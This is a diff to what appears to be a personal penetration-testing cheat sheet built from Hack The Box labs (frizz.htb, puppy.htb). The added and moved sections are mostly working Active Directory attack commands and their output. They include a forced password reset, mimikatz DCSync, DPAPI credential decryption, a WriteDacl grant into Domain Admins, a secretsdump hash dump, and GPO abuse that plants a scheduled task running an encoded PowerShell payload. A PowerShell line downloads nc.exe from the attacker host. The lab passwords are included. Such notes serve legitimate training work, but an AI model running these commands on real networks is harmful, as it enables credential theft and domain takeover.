@@ -71,6 +71,7 @@ disqus: hackmd
 ## Windows & Samba
 ### [Enum4linux](https://hackmd.io/@CHW/BJ0sNztaR#enum4linux)
 - `enum4linux -a {IP}`
+- `enum4linux -a -u <username> -p <password> {IP}`
 ### smbclient
 - `smbclient -N //{IP}/{DIR}`
 - `smbclient -L //{IP}/. -U "anonymous"`
@@ -249,6 +250,7 @@ nxc ssh 192.168.1.50 -u root -p toor -x "id"
 
 ## Bloodhound
 - `bloodhound-python -u {USER} -p {PWD} -d nagoya-industries.com -dc nagoya.nagoya-industries.com -ns 192.168.122.21 --dns-tcp --disable-autogc -c all`
+- `bloodhound-python -u 'ant.edwards' -p 'Antman2025!'  -d puppy.htb -ns 10.10.11.70 -c All --zip `
 - (回傳 Kali)
     - (Windows) `(New-Object Net.WebClient).DownloadFile("http://{Kali IP}/nc.exe", "C:\Users\f.frizzle\Desktop\nc.exe")`
     - (kali) `nc -lvnp 55688 > BloodHound.zip`
@@ -311,6 +313,8 @@ Mode                 LastWriteTime         Length Name
     - Kali: `impacket-GetNPUsers -dc-ip 192.168.181.70  -request -outputfile hashes.asreproast corp.com/pete`
 
 如果無法找到啟用了 "Do not require Kerberos preauthentication" 的帳戶，但擁有某個用戶的 GenericWrite 或 GenericAll 權限
+- 更改密碼：
+- `impacket-changepasswd 'PUPPY/<目標 user>@dc.puppy.htb' -newpass 'Chwchw41'  -altuser 'PUPPY/<已知 user>' -altpass '<已知 user pwd>' -reset  -dc-ip 10.10.11.7`
 - `Set-DomainObject -Identity "victim" -Set @{'userAccountControl'='4194304'}`
 - 破解密碼後還原設定: `Set-DomainObject -Identity "victim" -Set @{'userAccountControl'='512'}`
 
@@ -326,75 +330,6 @@ Mode                 LastWriteTime         Length Name
 - Kerberos
     - `impacket-getTGT frizz.htb/'f.frizzle':'Jenni_Luvs_Magic23' -dc-ip 10.10.11.60`
     - [*] Saving ticket in f.frizzle.ccache
-
-## Group Policy Object (GPO) Abuse
-- Group Policy Creator Owners
-
-```
-PS C:\Users\M.SchoolBus\Desktop> whoami /groups
-
-GROUP INFORMATION
------------------
-
-Group Name                                   Type             SID                                            Attributes                             
-                        
-============================================ ================ ============================================== ===============================================================
-...
-frizz\Group Policy Creator Owners            Group            S-1-5-21-2386970044-1145388522-2932701813-520  Mandatory group, Enabled by default, Enabled group
-
-PS C:\Users\M.SchoolBus\Desktop> New-GPO -Name chw | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes    
-
-GpoId       : 0329b9b2-02c7-4796-a039-fb5123d758fb
-DisplayName : chw
-Enabled     : True
-Enforced    : False
-Target      : OU=Domain Controllers,DC=frizz,DC=htb
-Order       : 3
-```
-![image](https://hackmd.io/_uploads/H197rJitlx.png)
-(Kali 匯入 SharpGPOAbuse.exe)
-```
-┌──(chw㉿CHW)-[~/Desktop/upload_tools]
-└─$ sudo ntpdate -u 10.10.11.60                                        
-┌──(chw㉿CHW)-[~/Desktop/upload_tools]
-└─$ impacket-getTGT frizz.htb/M.SchoolBus:'!suBcig@MehTed!R' -dc-ip 10.10.11.60
-...
-[*] Saving ticket in M.SchoolBus.ccache                                                        
-┌──(chw㉿CHW)-[~/Desktop/upload_tools]
-└─$ export KRB5CCNAME=M.SchoolBus.ccache                       
-┌──(chw㉿CHW)-[~/Desktop/upload_tools]
-└─$ KRB5CCNAME=M.SchoolBus.ccache \
-scp -P 22 -o GSSAPIAuthentication=yes -o PreferredAuthentications=gssapi-with-mic \
-  ./SharpGPOAbuse.exe m.schoolbus@frizz.htb:"C:/Users/m.schoolbus/Desktop/"
-SharpGPOAbuse.exe                                                                                                 100%   79KB  70.3KB/s   00:01    
-
-┌──(chw㉿CHW)-[~/Desktop/upload_tools]
-└─$ nc -lvnp 8888               
-listening on [any] 8888 ...
-
-```
-```
-PS C:\Users\M.SchoolBus\Desktop> .\SharpGPOAbuse.exe --addcomputertask --gponame "chw" --author TCG --taskname PrivEsc --command "powershell.exe" --arguments "powershell -e ...=="
-[+] Domain = frizz.htb
-[+] Domain Controller = frizzdc.frizz.htb
-[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb
-[+] GUID of "chw" is: {BC54F62C-D0BC-4C50-AFD7-43E0ACE49DA2}
-[+] Creating file \\frizz.htb\SysVol\frizz.htb\Policies\{BC54F62C-D0BC-4C50-AFD7-43E0ACE49DA2}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
-[+] versionNumber attribute changed successfully
-[+] The version number in GPT.ini was increased successfully.
-[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
-[+] Done!
-
-PS C:\Users\M.SchoolBus\Desktop> gpupdate /force
-Updating policy...
-
-Computer Policy update has completed successfully.
-User Policy update has completed successfully.
-```
-
-
-
-
 
 # Vuln
 ### WPscan
@@ -634,6 +569,102 @@ uid=1001(tom) gid=1001(tom) groups=1001(tom)
         Invoke-TokenManipulation -ImpersonateUser -ProcessId <PID>
         Invoke-TokenManipulation -CreateProcess "C:\Windows\System32\cmd.exe"
         ```
+
+### Group Policy Object (GPO) Abuse
+- Group Policy Creator Owners
+
+```
+PS C:\Users\M.SchoolBus\Desktop> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                   Type             SID                                            Attributes                             
+                        
+============================================ ================ ============================================== ===============================================================
+...
+frizz\Group Policy Creator Owners            Group            S-1-5-21-2386970044-1145388522-2932701813-520  Mandatory group, Enabled by default, Enabled group
+
+PS C:\Users\M.SchoolBus\Desktop> New-GPO -Name chw | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes    
+
+GpoId       : 0329b9b2-02c7-4796-a039-fb5123d758fb
+DisplayName : chw
+Enabled     : True
+Enforced    : False
+Target      : OU=Domain Controllers,DC=frizz,DC=htb
+Order       : 3
+```
+![image](https://hackmd.io/_uploads/H197rJitlx.png)
+(Kali 匯入 SharpGPOAbuse.exe)
+```
+┌──(chw㉿CHW)-[~/Desktop/upload_tools]
+└─$ sudo ntpdate -u 10.10.11.60                                        
+┌──(chw㉿CHW)-[~/Desktop/upload_tools]
+└─$ impacket-getTGT frizz.htb/M.SchoolBus:'!suBcig@MehTed!R' -dc-ip 10.10.11.60
+...
+[*] Saving ticket in M.SchoolBus.ccache                                                        
+┌──(chw㉿CHW)-[~/Desktop/upload_tools]
+└─$ export KRB5CCNAME=M.SchoolBus.ccache                       
+┌──(chw㉿CHW)-[~/Desktop/upload_tools]
+└─$ KRB5CCNAME=M.SchoolBus.ccache \
+scp -P 22 -o GSSAPIAuthentication=yes -o PreferredAuthentications=gssapi-with-mic \
+  ./SharpGPOAbuse.exe m.schoolbus@frizz.htb:"C:/Users/m.schoolbus/Desktop/"
+SharpGPOAbuse.exe                                                                                                 100%   79KB  70.3KB/s   00:01    
+
+┌──(chw㉿CHW)-[~/Desktop/upload_tools]
+└─$ nc -lvnp 8888               
+listening on [any] 8888 ...
+
+```
+```
+PS C:\Users\M.SchoolBus\Desktop> .\SharpGPOAbuse.exe --addcomputertask --gponame "chw" --author TCG --taskname PrivEsc --command "powershell.exe" --arguments "powershell -e ...=="
+[+] Domain = frizz.htb
+[+] Domain Controller = frizzdc.frizz.htb
+[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb
+[+] GUID of "chw" is: {BC54F62C-D0BC-4C50-AFD7-43E0ACE49DA2}
+[+] Creating file \\frizz.htb\SysVol\frizz.htb\Policies\{BC54F62C-D0BC-4C50-AFD7-43E0ACE49DA2}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
+[+] versionNumber attribute changed successfully
+[+] The version number in GPT.ini was increased successfully.
+[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
+[+] Done!
+
+PS C:\Users\M.SchoolBus\Desktop> gpupdate /force
+Updating policy...
+
+Computer Policy update has completed successfully.
+User Policy update has completed successfully.
+```
+### DPAPI
+(Bloodhound 沒路時可嘗試)
+- mimikatz: 
+    - `mimikatz.exe "dpapi::cred /in:C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\<file>"`
+    - `.\mimikatz.exe "lsadump::dcsync /user:puppy\administrator" exit`
+- [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) ([Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/tree/master)): `/home/chw/Desktop/upload_tools/SharpDPAPI.exe`
+    - `PS C:\Users\steph.cooper\Documents> .\SharpDPAPI.exe masterkeys /password:ChefSteph2025!` (User 的 pass)
+    - ```
+        .\SharpDPAPI.exe machinemasterkeys
+        .\SharpDPAPI.exe machinecredentials
+        .\SharpDPAPI.exe machinetriage  
+        ```
+    - `.\SharpDPAPI.exe credentials /password:ChefSteph2025! /target:C:\Users\steph.cooper\AppData\Roaming\Microsoft\<Windows Credential Manager blob>`
+- 離線爆: User密碼 和 SID 解密用户的 DPAPI 主密碼
+(參考 [HTB: Puppy](https://hackmd.io/@CHW/ByxGpuIkcgl#8-DPAPI))
+    - `C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407`
+    - `C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9`
+    - (Kali)
+    - `impacket-dpapi masterkey -file 556a2412_masterkey -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'`
+    - `impacket-dpapi credential -f C8D69E_blob -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84`
+
+### WriteDacl
+- 1. 編輯 Domain Admins ACL 將自己加入 Domain Admin
+`dacledit.py -action write -rights FullControl \
+  -principal PUPPY\\steph.cooper_adm \
+  -target "CN=Domain Admins,CN=Users,DC=puppy,DC=htb" \
+  -dc-ip 10.10.11.70 \
+  PUPPY/steph.cooper_adm:'FivethChipOnItsWay2025!'`
+
+- 2. (或) dump Administrator Hash
+`secretsdump.py 'PUPPY/steph.cooper_adm:FivethChipOnItsWay2025!@10.10.11.70'`
 
 ### PowerUp.ps1
 - `Get-ModifiableServiceFile`
